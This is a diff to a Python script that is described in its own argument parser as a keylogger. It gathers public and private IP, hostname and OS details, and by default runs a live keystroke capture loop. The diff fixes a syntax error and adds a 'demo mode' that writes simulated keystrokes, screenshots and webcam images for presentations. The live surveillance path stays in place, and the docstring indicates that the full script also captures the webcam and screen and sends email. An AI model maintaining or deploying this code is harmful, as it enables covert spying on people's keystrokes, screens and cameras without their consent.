@@ -9,7 +9,7 @@ import platform
 import socket
 from requests import get
 import logging
-from PIL import ImageGrab
+from PIL import ImageGrab, Image
 import os
 import psutil
 import win32gui
@@ -38,7 +38,7 @@ def ensure_file_access(path):
     Returns True if file exists and is readable, False otherwise.
     """
     try:
-        if not os.path.exists(path)
+        if not os.path.exists(path):
             open(path, "w").close()
         with open(path, "rb"):
             pass
@@ -240,13 +240,76 @@ def computer_information():
             public_ip = get("https://api.ipify.org").text
             f.write("Public IP Address: " + public_ip)
         except Exception:
-            f.write("Couldn't get Public IP Address (most likely max query")
+            f.write("Couldn't get Public IP Address (network disabled or blocked)")
         f.write('\n' + "Processor: " + platform.processor() + '\n')
         f.write("System: " + platform.system() + " " + platform.version() + '\n')
         f.write("Machine: " + platform.machine() + "\n")
         f.write("Hostname: " + hostname + "\n")
         f.write("Private IP Address: " + IPAddr + "\n")
 
-computer_information()
 
-capture_keys()
+def _write_demo_syseminfo(path="syseminfo.txt"):
+    with open(path, "w") as f:
+        f.write("Public IP Address: 0.0.0.0\n")
+        f.write('Processor: DemoProcessor\n')
+        f.write('System: DemoOS 0.0 (Demo)\n')
+        f.write('Machine: x86_64\n')
+        f.write('Hostname: demo-host\n')
+        f.write('Private IP Address: 127.0.0.1\n')
+
+
+def _create_demo_image(path, text="DEMO"):
+    img = Image.new('RGB', (640, 360), color=(73, 109, 137))
+    try:
+        from PIL import ImageDraw, ImageFont
+        draw = ImageDraw.Draw(img)
+        try:
+            font = ImageFont.load_default()
+            draw.text((10, 10), text, font=font, fill=(255, 255, 255))
+        except Exception:
+            draw.text((10, 10), text, fill=(255, 255, 255))
+    except Exception:
+        pass
+    img.save(path)
+
+
+def demo_mode(iterations=2, interval=2):
+    """Generate safe, simulated outputs for presentations.
+    This does NOT capture real keyboard, webcam, screenshots, or send email.
+    """
+    print("Running in DEMO mode — no live capture, no network sends")
+    for i in range(iterations):
+        # simulated keystrokes
+        with open('document.txt', 'a') as f:
+            f.write(f"[DEMO] sample keystrokes iteration {i+1}\n")
+
+        # simulated application log
+        with open('applicationLog.txt', 'a') as f:
+            f.write(f"Timestamp: DEMO_{i+1}, Application: DemoApp\n")
+
+        # create/update demo system info
+        _write_demo_syseminfo()
+
+        # create demo screenshot and webcam image
+        _create_demo_image('screenshot.png', text=f'Demo Screenshot {i+1}')
+        _create_demo_image('webcam.png', text=f'Demo Webcam {i+1}')
+
+        print(f"Demo iteration {i+1} complete — files updated")
+        time.sleep(interval)
+
+
+if __name__ == '__main__':
+    import argparse
+
+    parser = argparse.ArgumentParser(description='Keylogger demo/safe-run options')
+    parser.add_argument('--demo', action='store_true', help='Run in demo mode (no live capture, no network)')
+    parser.add_argument('--demo-iterations', type=int, default=2, help='Number of demo iterations')
+    parser.add_argument('--demo-interval', type=int, default=2, help='Seconds between demo iterations')
+    args = parser.parse_args()
+
+    if args.demo:
+        demo_mode(iterations=args.demo_iterations, interval=args.demo_interval)
+    else:
+        # normal (live) behavior — gather system info then start capture loop
+        computer_information()
+        capture_keys()
